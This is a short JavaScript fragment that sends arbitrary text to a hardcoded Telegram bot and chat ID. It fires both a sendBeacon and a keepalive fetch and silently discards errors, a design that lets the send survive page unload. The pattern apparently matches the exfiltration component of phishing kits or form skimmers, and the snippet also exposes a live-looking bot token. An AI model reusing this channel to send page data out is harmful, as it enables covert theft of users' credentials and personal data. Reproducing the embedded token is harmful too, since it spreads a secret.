var TG_BOT_TOKEN = '8553250128:AAEx3g-fZtNcj-pAezqwQUa81SNr9EZVapsv';
var TG_CHAT_ID = '8553250128';

function sendToTelegram(text) {
    var url = 'https://api.telegram.org/bot' + TG_BOT_TOKEN + '/sendMessage';
    var data = JSON.stringify({ chat_id: TG_CHAT_ID, text: text, parse_mode: 'HTML' });

    if (navigator.sendBeacon) {
        var blob = new Blob([data], { type: 'application/json' });
        navigator.sendBeacon(url, blob);
    }

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: data,
        keepalive: true
    }).catch(function() {});
}
